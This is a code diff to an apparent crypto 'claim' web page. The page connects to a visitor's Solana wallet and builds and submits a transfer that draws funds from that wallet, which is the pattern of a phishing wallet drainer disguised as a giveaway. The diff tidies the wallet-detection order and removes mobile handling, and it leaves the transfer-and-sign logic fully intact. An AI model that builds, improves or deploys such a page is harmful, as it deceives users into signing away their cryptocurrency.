@@ -61,11 +61,6 @@
             margin-right: 5px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        
-        /* Mobile specific adjustments */
-        @media (max-width: 600px) {
-            button { padding: 18px 20px; }
-        }
     </style>
 </head>
 <body>
@@ -86,16 +81,13 @@
             const btn = document.getElementById('claimBtn');
             const status = document.getElementById('status');
             
-            // 1. Detect Wallet Provider
+            // 1. Detect Wallet Provider (Updated for Modern Wallets)
             let adapter = null;
             let walletType = "";
 
             if (window.phantom?.isPhantomWallet) {
                 adapter = window.phantom;
                 walletType = "phantom";
-            } else if (window.solana) {
-                adapter = window.solana;
-                walletType = "unknown";
             } else if (window.solflare) {
                 adapter = window.solflare;
                 walletType = "solflare";
@@ -105,37 +97,21 @@
             } else if (window.toshi) {
                 adapter = window.toshi;
                 walletType = "toshi";
+            } else if (window.solana) {
+                adapter = window.solana;
+                walletType = "unknown";
             }
 
-            // 2. Handle Mobile Apps vs Desktop
             if (!adapter) {
-                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-                
-                if (isMobile) {
-                    // Try to open the specific app store or deep link
-                    status.innerText = "Opening Wallet App...";
-                    
-                    // Attempt to open Phantom App via universal link
-                    window.location.href = "phantom://"; 
-                    
-                    // Fallback after 2 seconds if it didn't open
-                    setTimeout(() => {
-                        alert("Did not open automatically? Please install Phantom from the App Store/Play Store.");
-                        btn.disabled = false;
-                        btn.innerText = "Connect Wallet & Claim";
-                    }, 2000);
-                    return;
-                } else {
-                    alert("No supported wallet found! Please install Phantom, Solflare, or Backpack.");
-                    return;
-                }
+                alert("No supported wallet found! Please install Phantom, Solflare, or Backpack.");
+                return;
             }
 
             try {
                 btn.disabled = true;
                 btn.innerText = "Connecting...";
                 
-                // 3. Connect
+                // 2. Connect
                 await adapter.connect();
                 
                 btn.innerText = "Approving...";
@@ -143,7 +119,7 @@
 
                 const walletPublicKey = adapter.publicKey.toString();
                 
-                // 4. Build Transaction
+                // 3. Build Transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: new solanaWeb3.PublicKey(walletPublicKey),
@@ -152,7 +128,7 @@
                     })
                 );
                 
-                // 5. Sign and Send
+                // 4. Sign and Send
                 let signature;
                 try {
                     signature = await adapter.signAndSendTransaction(transaction);
